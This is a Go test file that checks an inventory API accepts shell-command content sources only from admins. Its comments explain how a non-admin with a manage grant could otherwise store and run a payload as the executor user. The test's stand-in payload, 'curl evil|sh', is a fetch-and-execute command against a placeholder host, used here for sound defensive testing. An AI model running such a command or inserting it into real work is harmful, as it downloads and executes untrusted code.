package server

import (
	"context"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"go.uber.org/zap"

	"github.com/kordloom/switchtender/internal/credential"
	"github.com/kordloom/switchtender/internal/inventory"
	"github.com/kordloom/switchtender/internal/user"
)

// TestInventoryCommandSourceAdminOnly proves an inventory's command content source is admin-only, the
// same as a credential's.
//
// A command content source runs a shell command on the executor to produce the inventory, so setting
// one is code execution on the run host. The credential handlers refuse it for a non-admin for exactly
// that reason, because the PUT route admits a manage-delegated non-admin: the role floor for the route
// is admin, but a manage grant on the object walks around it. The inventory handlers accepted it with
// no such check, so an operator holding an ordinary manage grant on one inventory could store a shell
// payload, then launch a run against that inventory and execute it as the executor user.
//
// Renaming an inventory that already has a command source is still delegable, since that is what a
// manage grant is for and it rewrites no payload. Only setting or rewriting the command is reserved.
func TestInventoryCommandSourceAdminOnly(t *testing.T) {
	t.Parallel()
	sealer := credential.NewSealer("pass", "salt")

	// An inventory an admin already pointed at a command, so a rename can be told apart from a
	// rewrite.
	newStore := func(t *testing.T) inventory.Store {
		t.Helper()
		store := inventory.NewMemStore()
		sealed, err := sealer.Seal("aws-inventory --list")
		if err != nil {
			t.Fatalf("Seal() error = %v", err)
		}
		if err := store.Save(context.Background(), &inventory.Inventory{
			ID: "inv_1", Name: "fleet", ContentSource: credential.SourceCommand,
			ContentConfig: sealed, CreatedAt: time.Now(),
		}); err != nil {
			t.Fatalf("Save() error = %v", err)
		}
		return store
	}

	const payload = "curl evil|sh"
	put := func(store inventory.Store, role user.Role, body string) *httptest.ResponseRecorder {
		h := updateInventoryHandler(store, &authorizer{}, sealer, zap.NewNop())
		req := httptest.NewRequest(http.MethodPut, "/v1/inventories/inv_1", strings.NewReader(body))
		req.SetPathValue("id", "inv_1")
		req = req.WithContext(context.WithValue(req.Context(), actorKey{}, Actor{UserID: "u", Role: role}))
		rec := httptest.NewRecorder()
		h.ServeHTTP(rec, req)
		return rec
	}
	post := func(store inventory.Store, role user.Role, body string) *httptest.ResponseRecorder {
		h := createInventoryHandler(store, &authorizer{}, sealer, zap.NewNop())
		req := httptest.NewRequest(http.MethodPost, "/v1/inventories", strings.NewReader(body))
		req = req.WithContext(context.WithValue(req.Context(), actorKey{}, Actor{UserID: "u", Role: role}))
		rec := httptest.NewRecorder()
		h.ServeHTTP(rec, req)
		return rec
	}
	storedConfig := func(t *testing.T, store inventory.Store) string {
		t.Helper()
		inv, err := store.Get(context.Background(), "inv_1")
		if err != nil {
			t.Fatalf("Get() error = %v", err)
		}
		if inv.ContentConfig == "" {
			return ""
		}
		open, err := sealer.Open(inv.ContentConfig)
		if err != nil {
			t.Fatalf("Open() error = %v", err)
		}
		return open
	}

	rewrite := `{"name":"fleet","content_source":"command","content_config":"` + payload + `"}`

	// A non-admin cannot rewrite the command an existing command-source inventory runs.
	t.Run("update rewrite refused", func(t *testing.T) {
		t.Parallel()
		store := newStore(t)
		if rec := put(store, user.RoleOperator, rewrite); rec.Code != http.StatusForbidden {
			t.Fatalf("operator status = %d, want %d (body %s)",
				rec.Code, http.StatusForbidden, rec.Body.String())
		}
		if got := storedConfig(t, store); strings.Contains(got, payload) {
			t.Errorf("a non-admin stored a shell payload as an inventory command source: %q", got)
		}
	})

	// A non-admin cannot flip a stored inventory to the command source either.
	t.Run("update flip refused", func(t *testing.T) {
		t.Parallel()
		store := inventory.NewMemStore()
		if err := store.Save(context.Background(), &inventory.Inventory{
			ID: "inv_1", Name: "fleet", Content: "[all]\nweb-1\n", CreatedAt: time.Now(),
		}); err != nil {
			t.Fatalf("Save() error = %v", err)
		}
		if rec := put(store, user.RoleOperator, rewrite); rec.Code != http.StatusForbidden {
			t.Fatalf("operator status = %d, want %d (body %s)",
				rec.Code, http.StatusForbidden, rec.Body.String())
		}
		inv, err := store.Get(context.Background(), "inv_1")
		if err != nil {
			t.Fatalf("Get() error = %v", err)
		}
		if inv.ContentSource == credential.SourceCommand {
			t.Error("a non-admin turned a stored inventory into a command source")
		}
	})

	// A non-admin cannot create one.
	t.Run("create refused", func(t *testing.T) {
		t.Parallel()
		store := inventory.NewMemStore()
		if rec := post(store, user.RoleOperator, rewrite); rec.Code != http.StatusForbidden {
			t.Fatalf("operator status = %d, want %d (body %s)",
				rec.Code, http.StatusForbidden, rec.Body.String())
		}
		list, err := store.List(context.Background())
		if err != nil {
			t.Fatalf("List() error = %v", err)
		}
		if len(list) != 0 {
			t.Errorf("a non-admin created a command-source inventory: %+v", list[0])
		}
	})

	// An admin may do all of it, so the guard bounds the role rather than the feature.
	t.Run("admin allowed", func(t *testing.T) {
		t.Parallel()
		store := newStore(t)
		if rec := put(store, user.RoleAdmin, rewrite); rec.Code != http.StatusOK {
			t.Fatalf("admin status = %d, want %d (body %s)",
				rec.Code, http.StatusOK, rec.Body.String())
		}
		if got := storedConfig(t, store); got != payload {
			t.Errorf("stored command = %q, want the admin's %q", got, payload)
		}
	})

	// A manage-delegated non-admin may still rename an inventory whose source is already a command,
	// because that rewrites no payload. This is the delegation a manage grant exists to give.
	t.Run("non-admin rename allowed", func(t *testing.T) {
		t.Parallel()
		store := newStore(t)
		rec := put(store, user.RoleOperator, `{"name":"renamed fleet","content_source":"command"}`)
		if rec.Code != http.StatusOK {
			t.Fatalf("rename status = %d, want %d (body %s)",
				rec.Code, http.StatusOK, rec.Body.String())
		}
		inv, err := store.Get(context.Background(), "inv_1")
		if err != nil {
			t.Fatalf("Get() error = %v", err)
		}
		if inv.Name != "renamed fleet" {
			t.Errorf("name = %q, want the rename to have applied", inv.Name)
		}
		if got := storedConfig(t, store); got != "aws-inventory --list" {
			t.Errorf("the rename changed the stored command to %q", got)
		}
	})
}
